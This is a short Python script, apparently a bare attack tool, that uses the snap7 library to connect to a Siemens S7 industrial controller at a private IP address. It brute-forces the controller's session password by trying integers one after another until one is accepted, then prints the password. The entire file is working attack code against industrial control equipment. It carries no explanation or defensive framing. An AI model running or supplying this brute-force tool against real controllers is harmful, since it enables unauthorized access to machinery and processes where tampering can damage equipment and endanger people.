import snap7 
plc = snap7.client.Client()
plc.connect("192.168.50.212",0,2)

ok=0
pas=0
while ok==0:
    try:         
        plc.set_session_password(str(pas))
        ok=1
    except:
        pas=pas+1
        ok=0
print(pas)